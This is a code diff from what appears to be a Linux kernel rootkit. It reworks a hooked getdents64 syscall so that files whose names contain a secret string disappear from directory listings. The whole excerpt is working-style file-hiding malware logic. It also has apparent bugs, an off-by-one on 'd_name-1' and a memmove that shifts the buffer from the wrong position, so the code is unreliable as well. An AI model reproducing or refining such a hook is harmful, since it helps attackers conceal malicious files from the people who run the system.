@@ -85,21 +85,23 @@ asmlinkage long totallyReal_getdents64 (int fd, struct linux_dirent64 *dirp, int
 	pr_info("fakeGetDents: copied original dirp '%p' to new dirp '%p'\n", dirp, mod_dirp);
 
 	// iterate through all files and hide any with secret string in filename
-	int i;
+	int off = 0;
 	struct linux_dirent64 *p_dirp;
-	for (i = 0; i < nread; ) {
-		p_dirp = (void *)dirp + i;
-		pr_info("fakeGetDents: reading off address %p from mod_dirp\n", p_dirp);
+	while (off < nread) {
+		p_dirp = (void *)mod_dirp + off;
+		pr_info("fakeGetDents: reading off address %p from copied dirp\n", p_dirp);
 		
-		if (memcmp(SECRET_STRING, p_dirp->d_name, strlen(SECRET_STRING)) == 0) {
-			pr_info("fakeGetDents: super secret file '%s'\n", p_dirp->d_name);
+		// if filename contains secret string, remove file from struct
+		if (strstr(p_dirp->d_name-1, SECRET_STRING) != NULL) {
+			pr_info("fakeGetDents: hiding super secret file '%s'\n", p_dirp->d_name-1);
 			nread -= p_dirp->d_reclen;
-			memmove(dirp, (void *)mod_dirp+p_dirp->d_reclen, nread);
+			memmove(mod_dirp, (void *)mod_dirp + p_dirp->d_reclen, nread);
+			continue;
 		} else {
-			pr_info("fakeGetDents: skip file '%s'\n", p_dirp->d_name);
+			pr_info("fakeGetDents: normal file '%s'\n", p_dirp->d_name-1);
 		}
-		i += p_dirp->d_reclen;
-		pr_info("fakeGetDents: incrementing pointer by %d spaces; bytes left to read = %d\n", i, nread - i);
+		off += p_dirp->d_reclen;
+		//pr_info("fakeGetDents: incrementing pointer by %d spaces; bytes left to read = %d\n", i, nread - i);
 	}
 
 	// copy contents of modified dirp back to original dirp
